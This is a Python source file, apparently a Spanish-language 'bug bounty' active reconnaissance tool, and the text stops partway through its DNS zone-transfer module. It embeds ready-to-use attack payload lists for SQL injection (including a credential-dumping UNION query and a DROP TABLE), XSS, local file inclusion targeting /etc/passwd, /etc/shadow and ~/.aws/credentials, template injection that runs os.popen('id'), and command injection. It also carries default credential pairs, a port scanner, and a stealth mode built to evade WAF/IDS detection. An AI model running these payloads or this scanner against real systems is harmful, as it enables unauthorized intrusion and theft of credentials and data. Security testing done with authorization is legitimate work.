#!/usr/bin/env python3
"""
Active Reconnaissance Tool v2.0 - Advanced Bug Bounty Edition
Author: Sebastian Rivera
Solo para targets autorizados.
"""

import sys
import os
import re
import json
import socket
import ssl
import time
import argparse
import threading
import hashlib
import base64
import random
import struct
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote, unquote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser
from collections import deque, defaultdict

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] requests no instalado: pip install requests")
    sys.exit(1)

try:
    import dns.resolver
    import dns.zone
    import dns.query
    import dns.rdatatype
except ImportError:
    dns = None


# =====================================================================
#  COLORES
# =====================================================================
class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; CY = "\033[96m"; W = "\033[97m"; D = "\033[90m"
    BOLD = "\033[1m"; X = "\033[0m"

NO_COLOR = False

def _c(code, text):
    return text if NO_COLOR else f"{code}{text}{C.X}"

def log_info(msg):
    print(f"  {_c(C.B, '[*]')} {msg}")

def log_ok(msg):
    print(f"  {_c(C.G, '[+]')} {msg}")

def log_warn(msg):
    print(f"  {_c(C.Y, '[!]')} {msg}")

def log_fail(msg):
    print(f"  {_c(C.R, '[-]')} {msg}")

def log_vuln(severity, msg):
    colors = {"CRITICAL": C.R+C.BOLD, "HIGH": C.R, "MEDIUM": C.Y, "LOW": C.B, "INFO": C.D}
    color = colors.get(severity, C.W)
    tag = _c(color, f"[{severity}]")
    print(f"  {tag} {msg}")

def banner():
    print(_c(C.R+C.BOLD, """
    ╔══════════════════════════════════════════════╗
    ║     ACTIVE RECON TOOL v2.0                   ║
    ║     Advanced Bug Bounty Edition               ║
    ╚══════════════════════════════════════════════╝"""))


# =====================================================================
#  DISCLAIMER LEGAL
# =====================================================================
def show_disclaimer():
    d = f"""
{_c(C.R+C.BOLD, '╔═══════════════════════════════════════════════════════════════════════╗')}
{_c(C.R+C.BOLD, '║                      ADVERTENCIA LEGAL                                ║')}
{_c(C.R+C.BOLD, '╠═══════════════════════════════════════════════════════════════════════╣')}
{_c(C.R+C.BOLD, '║                                                                       ║')}
{_c(C.R+C.BOLD, '║  Esta herramienta realiza reconocimiento ACTIVO contra sistemas.       ║')}
{_c(C.R+C.BOLD, '║  Envia paquetes, solicitudes HTTP, payloads de prueba y escanea        ║')}
{_c(C.R+C.BOLD, '║  puertos y servicios del objetivo. ESTO ES INTRUSIVO.                  ║')}
{_c(C.R+C.BOLD, '║                                                                       ║')}
{_c(C.Y, '║  SOLO debe usarse contra targets para los cuales tienes              ║')}
{_c(C.Y, '║  AUTORIZACION EXPLICITA Y POR ESCRITO, incluyendo:                   ║')}
{_c(C.Y, '║                                                                       ║')}
{_c(C.Y, '║    - Programas de bug bounty con el target en scope                   ║')}
{_c(C.Y, '║    - Servidores y aplicaciones propias                                ║')}
{_c(C.Y, '║    - Entornos de laboratorio / CTF                                    ║')}
{_c(C.Y, '║    - Pentests con contrato firmado                                    ║')}
{_c(C.R+C.BOLD, '║                                                                       ║')}
{_c(C.R+C.BOLD, '║  CONSECUENCIAS DEL USO NO AUTORIZADO:                                 ║')}
{_c(C.R+C.BOLD, '║                                                                       ║')}
{_c(C.R, '║    - Cargos criminales por acceso no autorizado a sistemas            ║')}
{_c(C.R, '║      informaticos (leyes de cibercrimen nacionales e internacionales) ║')}
{_c(C.R, '║    - Penas de prision de 1 a 10 anios segun jurisdiccion             ║')}
{_c(C.R, '║    - Multas economicas severas                                        ║')}
{_c(C.R, '║    - Responsabilidad civil por danios y perjuicios                    ║')}
{_c(C.R, '║    - Prohibicion permanente de plataformas de bug bounty              ║')}
{_c(C.R, '║    - Antecedentes penales que afectan empleo futuro                   ║')}
{_c(C.R+C.BOLD, '║                                                                       ║')}
{_c(C.R+C.BOLD, '║  El autor NO se hace responsable del uso indebido.                     ║')}
{_c(C.R+C.BOLD, '║  USALA BAJO TU PROPIA RESPONSABILIDAD.                                ║')}
{_c(C.R+C.BOLD, '║                                                                       ║')}
{_c(C.R+C.BOLD, '╚═══════════════════════════════════════════════════════════════════════╝')}
"""
    print(d)
    try:
        resp = input(f"  {_c(C.Y, '[?]')} Tienes autorizacion legal para escanear este target? (s/n): ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        sys.exit(0)
    if resp not in ("s", "si", "y", "yes"):
        print(f"\n  {_c(C.R, '[!] Operacion cancelada. No se realizaron escaneos.')}")
        sys.exit(0)
    print()


# =====================================================================
#  SPEED MODES
# =====================================================================
SPEED_MODES = {
    "slow": {
        "name": "SLOW (Stealth)",
        "desc": "Casi indetectable. Delays largos, User-Agents rotativos, orden aleatorio.",
        "rate_limit": 1, "delay_min": 2.0, "delay_max": 5.0,
        "threads": 2, "rotate_ua": True, "jitter": True, "randomize": True,
    },
    "medium": {
        "name": "MEDIUM (Balanced)",
        "desc": "Balance entre velocidad y sigilo. Moderadamente detectable.",
        "rate_limit": 8, "delay_min": 0.3, "delay_max": 1.0,
        "threads": 5, "rotate_ua": True, "jitter": True, "randomize": True,
    },
    "high": {
        "name": "HIGH (Aggressive)",
        "desc": "Velocidad maxima. Facilmente detectable por WAF/IDS.",
        "rate_limit": 0, "delay_min": 0, "delay_max": 0.05,
        "threads": 15, "rotate_ua": False, "jitter": False, "randomize": False,
    },
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

def select_mode_interactive():
    print(_c(C.CY+C.BOLD, """
    ╔══════════════════════════════════════════════════╗
    ║          SELECCIONA EL MODO DE ESCANEO           ║
    ╠══════════════════════════════════════════════════╣
    ║                                                  ║
    ║  [1] SLOW   - Sigiloso, casi indetectable        ║
    ║              Delay 2-5s entre requests            ║
    ║              User-Agents rotativos                ║
    ║              Orden aleatorio de pruebas           ║
    ║                                                  ║
    ║  [2] MEDIUM - Balance velocidad/sigilo            ║
    ║              Delay 0.3-1s entre requests          ║
    ║              Moderadamente detectable             ║
    ║                                                  ║
    ║  [3] HIGH   - Agresivo, maxima velocidad          ║
    ║              Sin delays, 15 hilos paralelos       ║
    ║              Facilmente detectable                ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝"""))
    while True:
        try:
            choice = input(f"\n  {_c(C.Y, '[?]')} Modo (1/2/3): ").strip()
        except (KeyboardInterrupt, EOFError):
            print()
            sys.exit(0)
        if choice == "1":
            return "slow"
        elif choice == "2":
            return "medium"
        elif choice == "3":
            return "high"
        else:
            print(f"  {_c(C.R, '[!]')} Opcion invalida. Ingresa 1, 2 o 3.")


# =====================================================================
#  RATE LIMITER (SPEED-AWARE)
# =====================================================================
class RateLimiter:
    def __init__(self, mode_config):
        self.config = mode_config
        self.max_rps = mode_config["rate_limit"]
        self.last_request = 0
        self.lock = threading.Lock()
        self.request_count = 0

    def wait(self):
        with self.lock:
            self.request_count += 1
            now = time.time()
            # Base rate limiting
            if self.max_rps > 0:
                min_interval = 1.0 / self.max_rps
                elapsed = now - self.last_request
                if elapsed < min_interval:
                    time.sleep(min_interval - elapsed)
            # Additional jitter delay for stealth
            if self.config["jitter"]:
                delay = random.uniform(self.config["delay_min"], self.config["delay_max"])
                time.sleep(delay)
            elif self.config["delay_max"] > 0:
                time.sleep(self.config["delay_min"])
            self.last_request = time.time()


# =====================================================================
#  HTTP SESSION & UTILITIES
# =====================================================================
def create_session(user_agent=None, proxy=None, cookies=None, headers=None, timeout=10, rotate_ua=False):
    s = requests.Session()
    s.verify = False
    s.timeout = timeout
    if rotate_ua:
        s.headers["User-Agent"] = random.choice(USER_AGENTS)
    else:
        s.headers["User-Agent"] = user_agent or USER_AGENTS[0]
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    if cookies:
        for ck in cookies.split(";"):
            if "=" in ck:
                k, v = ck.strip().split("=", 1)
                s.cookies.set(k.strip(), v.strip())
    if headers:
        for h in headers.split(";;"):
            if ":" in h:
                k, v = h.strip().split(":", 1)
                s.headers[k.strip()] = v.strip()
    return s

def safe_request(session, method, url, rate_limiter=None, rotate_ua=False, **kwargs):
    if rate_limiter:
        rate_limiter.wait()
    if rotate_ua:
        session.headers["User-Agent"] = random.choice(USER_AGENTS)
    try:
        kwargs.setdefault("timeout", 10)
        kwargs.setdefault("verify", False)
        kwargs.setdefault("allow_redirects", False)
        return session.request(method, url, **kwargs)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
            requests.exceptions.TooManyRedirects, Exception):
        return None

def get_domain(url):
    return urlparse(url).hostname or ""

def get_base_url(url):
    p = urlparse(url)
    scheme = p.scheme or "https"
    host = p.hostname or ""
    port = p.port
    if port and port not in (80, 443):
        return f"{scheme}://{host}:{port}"
    return f"{scheme}://{host}"

def resolve_host(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None

def section_header(title):
    sep = "=" * 60
    if NO_COLOR:
        print(f"\n{sep}\n  {title}\n{sep}")
    else:
        print(f"\n{C.CY}{sep}{C.X}\n  {C.BOLD}{C.CY}{title}{C.X}\n{C.CY}{sep}{C.X}")


# =====================================================================
#  WORDLISTS INTEGRADAS
# =====================================================================
TOP_PORTS = [
    21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,514,515,
    587,631,636,993,995,1080,1433,1434,1521,1723,2049,2082,2083,2086,
    2087,2096,2181,3000,3001,3128,3268,3306,3389,3690,4443,4848,5000,
    5001,5432,5555,5601,5672,5900,5985,5986,6000,6379,6443,6666,7001,
    7002,7070,7443,8000,8001,8008,8009,8010,8020,8042,8060,8069,8080,
    8081,8082,8083,8084,8085,8086,8088,8090,8091,8181,8443,8444,8800,
    8880,8888,8983,9000,9001,9042,9043,9060,9080,9090,9091,9200,9300,
    9443,9999,10000,11211,15672,27017,27018,28017,50000,50070,
]

DIR_WORDLIST = [
    "admin","administrator","admin.php","admin.html","admin/login",
    "login","login.php","signin","auth","authenticate",
    "wp-admin","wp-login.php","wp-content","wp-includes","wp-json",
    "api","api/v1","api/v2","api/v3","api/docs","api/swagger",
    "swagger","swagger-ui","swagger.json","swagger.yaml","openapi.json",
    "graphql","graphiql","graphql/console","altair",
    "console","dashboard","panel","portal","manager",
    "config","config.php","config.yml","config.json","config.xml",
    "configuration","settings","setup","install","installer",
    ".env",".env.bak",".env.local",".env.production",".env.development",
    ".env.staging",".env.old",".env.save",".env.swp",".env.example",
    ".git",".git/config",".git/HEAD",".git/logs/HEAD",".gitignore",
    ".svn",".svn/entries",".svn/wc.db",".hg",".hg/store",
    ".htaccess",".htpasswd","web.config","nginx.conf","httpd.conf",
    "robots.txt","sitemap.xml","crossdomain.xml","clientaccesspolicy.xml",
    "security.txt",".well-known/security.txt",".well-known/openid-configuration",
    "backup","backup.sql","backup.zip","backup.tar.gz","backup.bak","backup.rar",
    "db","database","database.sql","dump","dump.sql","db.sql","data.sql",
    "test","testing","test.php","test.html","debug","debug.php",
    "info.php","phpinfo.php","info","server-info","server-status",
    "status","health","healthcheck","health.json","ready","alive",
    "uploads","upload","files","media","images","assets","static",
    "tmp","temp","cache","log","logs","error.log","access.log","debug.log",
    "private","secret","internal","restricted","confidential",
    "cgi-bin","cgi","scripts","bin",
    "phpmyadmin","pma","phpMyAdmin","myadmin","adminer","adminer.php",
    "webmail","mail","email","roundcube",
    "cpanel","whm","plesk",
    "jenkins","hudson","bamboo","travis","circleci",
    "jira","confluence","bitbucket","gitlab","git","redmine","bugzilla",
    "nagios","zabbix","grafana","prometheus","kibana","datadog",
    "solr","elasticsearch","sphinx",
    "tomcat","manager/html","host-manager","jmx-console","web-console","invoker",
    "actuator","actuator/health","actuator/env","actuator/beans","actuator/info",
    "actuator/mappings","actuator/configprops","actuator/trace","actuator/heapdump",
    "actuator/threaddump","actuator/loggers","actuator/auditevents",
    "metrics","monitoring","_debug","_profiler",
    "node_modules","package.json","package-lock.json","yarn.lock",
    "composer.json","composer.lock","Gemfile","requirements.txt",
    "Dockerfile","docker-compose.yml",".dockerignore","Procfile",
    "Makefile","webpack.config.js","tsconfig.json",".babelrc",
    "README.md","README.txt","CHANGELOG","CHANGELOG.md","LICENSE",
    "wp-config.php","wp-config.php.bak","wp-config.php.old","wp-config.php~",
    "xmlrpc.php","wp-cron.php","wp-json/wp/v2/users",
    "user","users","accounts","account","profile","register","signup",
    "password","forgot","reset","recover","logout",
    "search","download","downloads","export","reports","analytics",
    "docs","documentation","help","faq","support","about","contact",
    "old","legacy","archive","dev","development","staging","beta","sandbox",
    "proxy","gateway","redirect","callback","oauth","oauth2","sso","saml",
    "token","session","cron","jobs","queue","worker",
    ".DS_Store","Thumbs.db","trace.axd","elmah.axd",
    "server","services","service","include","includes","lib","src","app","vendor",
    "data","db.sqlite","db.sqlite3","firebase.json",".firebase",
    "realms","auth/realms","keycloak",
    # Archivos de respaldo comunes
    "index.php.bak","index.php.old","index.php~","index.php.save",
    "index.html.bak","index.html.old",
    "web.config.bak","web.config.old",
    "config.php.bak","config.php.old","config.php~",
    "application.yml","application.properties","appsettings.json",
    "appsettings.Development.json",
    # Archivos de IDE/editor
    ".idea",".vscode",".vscode/settings.json",".project",".classpath",
    # AWS/Cloud
    ".aws/credentials",".aws/config","aws.yml","s3.yml",
    # Kubernetes
    ".kube/config","kubernetes.yml","k8s.yml","helm",
    # CI/CD
    ".github",".github/workflows",".gitlab-ci.yml","Jenkinsfile",
    ".circleci/config.yml",".travis.yml",
]

SUB_WORDLIST = [
    "www","mail","ftp","smtp","pop","imap","webmail",
    "admin","administrator","panel","cpanel","whm",
    "ns1","ns2","ns3","dns","dns1","dns2",
    "api","api2","apis","rest","graphql",
    "dev","development","staging","stage","test","testing",
    "beta","alpha","demo","sandbox","preview",
    "prod","production","live",
    "app","apps","application","mobile","m",
    "portal","gateway","proxy","vpn","remote",
    "cdn","static","assets","media","images","img",
    "docs","doc","documentation","wiki","help","support",
    "blog","news","press","forum","community",
    "shop","store","ecommerce","cart","checkout",
    "git","gitlab","github","bitbucket","svn","repo",
    "jenkins","ci","cd","build","deploy",
    "jira","confluence","redmine","bugzilla","issues",
    "monitor","monitoring","grafana","prometheus","nagios","zabbix",
    "elk","kibana","elasticsearch","logstash",
    "db","database","mysql","postgres","mongo","redis","memcached",
    "backup","bak","old","legacy","archive",
    "internal","intranet","private","corp","corporate",
    "sso","auth","login","id","identity","oauth",
    "email","mx","relay","exchange",
    "s3","storage","files","upload","downloads",
    "status","health","uptime",
    "calendar","meet","chat","slack","teams",
    "crm","erp","hr","finance",
    "analytics","metrics","stats","reports",
    "web","www2","www3","web1","web2",
    "host","server","node","cluster",
    "edge","lb","loadbalancer",
    "cache","varnish","nginx",
    "queue","rabbit","kafka","mq",
    "search","solr","elastic",
    "payments","pay","billing","invoice",
    "secure","ssl","tls",
    "stg","uat","qa","preprod","pre-prod",
    "v1","v2","api-v1","api-v2",
]

PARAM_WORDLIST = [
    "id","page","file","path","dir","search","q","query","s",
    "url","uri","redirect","return","next","goto","target","dest",
    "rurl","return_url","redirect_url","callback","continue",
    "user","username","email","name","login","password",
    "token","key","api_key","apikey","secret","session",
    "cmd","command","exec","run","action","do",
    "cat","category","type","sort","order","limit","offset",
    "lang","language","locale","country",
    "template","theme","view","layout","module","plugin",
    "include","require","load","read","fetch","get",
    "format","output","export","download",
    "debug","test","verbose","mode",
    "admin","role","level","access","permission",
    "filter","where","select","from","table",
    "host","port","server","domain","ip",
    "config","setting","option","param","data","input","value",
    "ref","source","origin","site","base","root",
    "body","content","text","message","comment","description",
    "filename","document","report","log","trace",
]

API_WORDLIST = [
    "api","api/v1","api/v2","api/v3",
    "api/users","api/user","api/me","api/profile",
    "api/admin","api/config","api/settings",
    "api/auth","api/login","api/register","api/token","api/refresh",
    "api/search","api/query",
    "api/upload","api/files","api/download",
    "api/health","api/status","api/version","api/info",
    "api/docs","api/swagger","api/openapi",
    "api/graphql","api/rest",
    "api/internal","api/private","api/debug",
    "api/test","api/dev",
    "rest/api","rest/v1","rest/v2",
    "v1","v2","v3",
    "api/products","api/orders","api/items",
    "api/comments","api/posts","api/pages",
    "api/notifications","api/messages",
    "api/roles","api/permissions",
    "api/keys","api/tokens","api/sessions",
    "api/logs","api/events","api/audit",
    "api/export","api/import","api/backup",
    "_api","__api","api_v1","api_v2",
    "api/.json","api/swagger.json","api/openapi.yaml",
    "api/schema","api/metadata",
]

DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("admin","admin123"),("admin","12345"),("admin","1234"),
    ("administrator","administrator"),("root","root"),
    ("root","toor"),("root","password"),("root","123456"),
    ("test","test"),("guest","guest"),("user","user"),
    ("demo","demo"),("admin","changeme"),("admin","default"),
    ("admin","pass"),("admin","letmein"),("tomcat","tomcat"),
    ("manager","manager"),("admin","P@ssw0rd"),("admin","qwerty"),
    ("admin","welcome"),("admin","master"),("admin","passw0rd"),
    ("ftp","ftp"),("oracle","oracle"),("postgres","postgres"),
    ("mysql","mysql"),("sa",""),("sa","sa"),
]

# Archivos sensibles para descubrimiento
SENSITIVE_FILES = [
    ".git/config",".git/HEAD",".git/logs/HEAD",".git/index",
    ".env",".env.bak",".env.local",".env.production",
    ".htaccess",".htpasswd",
    "web.config","nginx.conf","httpd.conf",
    "wp-config.php","wp-config.php.bak","wp-config.php~",
    "config.php","config.inc.php","config.old","config.bak",
    "database.yml","database.php","db.php","db_config.php",
    "settings.py","settings.ini","settings.cfg",
    "application.yml","application.properties",
    "appsettings.json","appsettings.Development.json",
    "composer.json","package.json","Gemfile","requirements.txt",
    "Dockerfile","docker-compose.yml",".dockerignore",
    ".travis.yml",".gitlab-ci.yml","Jenkinsfile",
    "phpinfo.php","info.php","test.php",
    "server-status","server-info",
    ".DS_Store","Thumbs.db",
    "crossdomain.xml","clientaccesspolicy.xml",
    "robots.txt","sitemap.xml","security.txt",
    "id_rsa","id_rsa.pub","id_dsa",
    ".ssh/authorized_keys",".ssh/id_rsa",
    "backup.sql","backup.zip","backup.tar.gz",
    "dump.sql","database.sql","data.sql",
    ".bash_history",".bashrc",".profile",
    "/etc/passwd","/etc/shadow","/etc/hosts",
    "wp-json/wp/v2/users",
    "actuator/env","actuator/heapdump","actuator/configprops",
    "trace.axd","elmah.axd",
    "firebase.json",".firebaserc",
    "aws.yml",".aws/credentials",
    "sftp-config.json","ftpsync.settings",
    "WEB-INF/web.xml","META-INF/context.xml",
    ".svn/entries",".svn/wc.db",
    ".hg/store","CVS/Entries",
]

# Payloads de inyeccion mejorados
SQLI_PAYLOADS = [
    "'","''","\"","' OR '1'='1","' OR '1'='1'--","' OR '1'='1'/*",
    "' OR 1=1--","' OR 1=1#","\" OR 1=1--","\" OR \"\"=\"",
    "admin'--","1' ORDER BY 1--","1' ORDER BY 100--",
    "1 UNION SELECT NULL--","1 UNION SELECT NULL,NULL--",
    "' AND 1=1--","' AND 1=2--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "';WAITFOR DELAY '0:0:5'--","' AND SLEEP(5)--","' AND pg_sleep(5)--",
    "1' AND BENCHMARK(5000000,MD5('test'))--",
    "') OR ('1'='1","')) OR (('1'='1",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "' UNION SELECT username,password FROM users--",
    "1; DROP TABLE--",
    "' OR ''='","1 OR 1=1",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax","mysql_fetch","mysql_num_rows",
    "warning: mysql","unclosed quotation mark","microsoft ole db",
    "odbc sql server driver","syntax error","postgresql","pg_query",
    "pg_exec","ora-01756","ora-00933","ora-00936","ora-00907",
    "sqlite3::","sqlite_","sqliteexception","pdo::","pdoexception",
    "sql syntax","sql error","sql command","database error","query failed",
    "db error","unexpected end of sql","unterminated string",
    "invalid query","sql server","jdbc","hibernate","jpa",
    "sqlalchemy","sequelize","prisma",
    "mariadb","microsoft sql","sql state","column count doesn't match",
    "supplied argument is not a valid mysql",
    "quoted string not properly terminated",
    "division by zero","conversion failed",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("return this")().alert(1)}}',
    '${alert(1)}',
    '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//",
    '<a href="javascript:alert(1)">click</a>',
    '<div onmouseover="alert(1)">hover</div>',
    "'-alert(1)//",
    '\';alert(1);//',
    "</script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

LFI_PAYLOADS = [
    "../../../etc/passwd","....//....//....//etc/passwd",
    "..\\..\\..\\etc\\passwd","..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd","/etc/shadow","/etc/hosts",
    "../../../../../../etc/passwd%00",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "file:///etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini","C:\\boot.ini",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    "/proc/self/environ","/proc/self/cmdline","/proc/version",
    "/var/log/apache2/access.log","/var/log/apache2/error.log",
    "/var/log/nginx/access.log","/var/log/nginx/error.log",
    "/var/log/auth.log","/var/log/syslog",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),
    ("{{config}}", "SECRET_KEY"),
    ("{{self.__class__}}", "__class__"),
    ("{{request.application.__globals__}}", "__globals__"),
    ("{{''.__class__.__mro__[2].__subclasses__()}}", "subprocess"),
    ("${{7*7}}", "49"),
    ("{{constructor.constructor('return 1')()}}", "1"),
    ("{%25+import+os+%25}{{os.popen('id').read()}}", "uid="),
    ("{{range.constructor(\"return global.process.mainModule\")()}}", "process"),
]

CMDI_PAYLOADS = [
    (";sleep 5", 5), ("|sleep 5", 5), ("||sleep 5", 5),
    ("&sleep 5", 5), ("&&sleep 5", 5),
    ("`sleep 5`", 5), ("$(sleep 5)", 5),
    ("\nsleep 5", 5), ("\rsleep 5", 5),
    (";ping -c 5 127.0.0.1", 5),
    ("|ping -c 5 127.0.0.1", 5),
    (";timeout 5", 5),
    # Windows
    ("&timeout /t 5", 5), ("|timeout /t 5", 5),
    ("&ping -n 5 127.0.0.1", 5),
]


# =====================================================================
#  HTML LINK PARSER
# =====================================================================
class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []
        self.forms = []
        self.params = set()
        self.emails = set()
        self.js_files = []
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "a" and "href" in d:
            self.links.append(d["href"])
        if tag == "form":
            self._current_form = {"action": d.get("action",""), "method": d.get("method","GET"), "inputs": []}
        if tag in ("input","textarea","select") and self._current_form is not None:
            name = d.get("name","")
            if name:
                self._current_form["inputs"].append(name)
                self.params.add(name)
        if tag == "script" and "src" in d:
            self.js_files.append(d["src"])
        if tag == "img" and "src" in d:
            pass
        if tag in ("input","textarea") and d.get("name"):
            self.params.add(d["name"])

    def handle_endtag(self, tag):
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None

    def handle_data(self, data):
        for em in re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', data):
            self.emails.add(em)


# =====================================================================
#  MODULE 1: PORT SCANNER
# =====================================================================
def mod_port_scan(ctx):
    section_header("PORT SCANNER")
    ports = ctx["ports"]
    host = ctx["target_host"]
    log_info(f"Escaneando {len(ports)} puertos en {host}...")
    open_ports = []
    closed = 0; filtered = 0

    def scan_port(port):
        ctx["rate_limiter"].wait()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(ctx["timeout"])
        try:
            r = sock.connect_ex((host, port))
            return ("open", port) if r == 0 else ("closed", port)
        except socket.timeout:
            return ("filtered", port)
        except Exception:
            return ("error", port)
        finally:
            sock.close()

    scan_list = list(ports)
    if ctx["mode_config"]["randomize"]:
        random.shuffle(scan_list)

    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
        futures = {executor.submit(scan_port, p): p for p in scan_list}
        for f in as_completed(futures):
            st, port = f.result()
            if st == "open":
                open_ports.append(port)
                log_ok(f"Puerto {port}/tcp ABIERTO")
            elif st == "filtered":
                filtered += 1
            else:
                closed += 1

    open_ports.sort()
    ctx["results"]["open_ports"] = open_ports
    log_info(f"Resultados: {len(open_ports)} abiertos, {closed} cerrados, {filtered} filtrados")


# =====================================================================
#  MODULE 2: SERVICE DETECTION
# =====================================================================
def mod_service_detect(ctx):
    section_header("SERVICE DETECTION")
    open_ports = ctx["results"].get("open_ports", [])
    if not open_ports:
        log_info("No hay puertos abiertos para analizar.")
        return

    common = {
        21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
        110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
        995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
        5432:"PostgreSQL",6379:"Redis",8080:"HTTP-Proxy",
        8443:"HTTPS-Alt",27017:"MongoDB",11211:"Memcached",
    }
    services = []
    for port in open_ports:
        ctx["rate_limiter"].wait()
        banner = ""
        svc = common.get(port, "Unknown")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(ctx["timeout"])
            sock.connect((ctx["target_host"], port))
            if port in (443,8443,993,995,465,636):
                c2 = ssl.create_default_context()
                c2.check_hostname = False
                c2.verify_mode = ssl.CERT_NONE
                sock = c2.wrap_socket(sock, server_hostname=ctx["target_host"])
            if port in (80,443,8080,8443,8000,8888,3000,5000,8008,9090):
                sock.send(f"HEAD / HTTP/1.1\r\nHost: {ctx['target_host']}\r\n\r\n".encode())
            sock.settimeout(3)
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            sock.close()
        except Exception:
            pass
        if banner:
            m = re.search(r'Server:\s*(.+)', banner, re.I)
            if m:
                svc = m.group(1).strip()
            elif "SSH" in banner:
                svc = banner.split("\n")[0].strip()
            elif "FTP" in banner:
                svc = banner.split("\n")[0].strip()
        services.append({"port": port, "service": svc, "banner": banner[:200]})
        log_ok(f"{port}/tcp -> {svc}")

    ctx["results"]["services"] = services


# =====================================================================
#  MODULE 3: DNS ZONE TRANSFER
# =====================================================================
def mod_zone_transfer(ctx):
    section_header("DNS ZONE TRANSFER")
    domain = ctx["domain"]
    if not dns:
        log_warn("dnspython no instalado, saltando modulo.")
        return
    findings = []
    try:
        ns_records = dns.resolver.resolve(domain, "NS")
        for ns in ns_records:
            ns_host = str(ns.target).rstrip(".")
            log_info(f"Probando AXFR en {ns_host}...")
            ctx["rate_limiter"].wait()
            try:
                z = dns.zone.from_xfr(dns.query.xfr(ns_host, domain, timeout=10))
                names = z.nodes.keys()
                log_vuln("HIGH", f"Zone transfer exitoso en {ns_host}! ({len(names)} registros)")
                for n in list(names)[:50]:
